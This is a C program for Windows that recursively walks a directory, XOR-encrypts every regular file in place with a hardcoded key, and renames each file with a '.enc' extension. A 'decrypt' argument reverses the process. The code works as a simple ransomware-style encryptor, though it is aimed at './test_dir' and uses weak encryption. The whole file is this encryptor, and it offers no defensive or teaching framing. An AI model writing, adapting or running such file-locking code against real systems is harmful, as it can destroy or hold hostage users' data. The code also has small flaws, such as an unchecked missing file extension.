#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#endif
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <errno.h>

#define MODE_ENCRYPT 1
#define MODE_DECRYPT 0

const char* encyption_key = "KEY";
static int encrypt = 1; // 1 encrypt; 0 decrypt;

void process_file(char* file, int encrypt)
{
    FILE*       fp;
    char*       extension;
    char*       contents;
    unsigned    file_size;

    // Check extension
    extension = strrchr(file, '.');
    if (encrypt == MODE_ENCRYPT)
    {
        if (!strncmp(extension, ".enc", 4))
        {
            return;
        }
    }

    // Attempt to open the target file
    if (!(fp = fopen(file, "rb+")))
    {
        perror("Error");
        return;
    }

    // Allocate memory for the encrypted file
    fseek(fp, 0, SEEK_END);
    file_size = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    contents = (char *)malloc(sizeof(char) * file_size + 1);

    // If file is not empty
    if (file_size)
    {
        file_size = fread(contents, sizeof(char), file_size, fp);
        rewind(fp);

        char* tmp = contents;
        for (unsigned i = 0; i < file_size; tmp++, i++)
        {
            size_t length = strlen(encyption_key);
            *tmp ^= encyption_key[i % length];
        }

        fwrite(contents, 1, file_size, fp);
    }

    free(contents);
    fclose(fp);

    if (encrypt == MODE_ENCRYPT) // Rename the file to .enc
    {
        size_t size = sizeof(char) * (strlen(file) + 5);
        char* new_file = (char *)malloc(size);

        memset(new_file, 0, size);
        snprintf(new_file, size, "%s.enc", file);

        rename(file, new_file);
        free(new_file);
    }
    else // Rename the file to its original name
    {
        char* encrypted_file = file;
        char* original_file = strdup(encrypted_file);

        extension = strrchr(original_file, '.');
        *extension = '\0';

        rename(encrypted_file, original_file);
        free(original_file);
    }
}

void walk_dir(char* dir_path)
{
    typedef WIN32_FIND_DATA FIND_DATA;

    FIND_DATA   findData;
    HANDLE      fHandle;
    TCHAR       abs_dir_path[MAX_PATH];
    char        wildcard[MAX_PATH];
    char        path[MAX_PATH];

    GetFullPathName(dir_path, MAX_PATH, abs_dir_path, NULL);
    snprintf(wildcard, sizeof(wildcard), "%s\\*", abs_dir_path);

    if ((fHandle = FindFirstFile(wildcard, &findData)) == INVALID_HANDLE_VALUE)
    {
        return;
    }

    do
    {
        if (strncmp(findData.cFileName, ".", 1) && strncmp(findData.cFileName, "..", 2))
        {
            snprintf(path, MAX_PATH, "%s\\%s", dir_path, findData.cFileName);

            if ( (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
                !(findData.dwFileAttributes & (FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_DEVICE)) )
            {
                walk_dir(path);
            }

            if (findData.dwFileAttributes & (FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_ARCHIVE))
            {
                process_file(path, encrypt);
            }

        }

    } while (FindNextFile(fHandle, &findData));

    FindClose(fHandle);
}

int main(int argc, char* argv[])
{
    char* const dir_path = "./test_dir";

    if (argc == 2) // Decrypt
    {
        if (!strncmp(argv[1], "decrypt", 7))
        {
            encrypt = 0;
        }
    }

    walk_dir(dir_path);

    return 0;
}
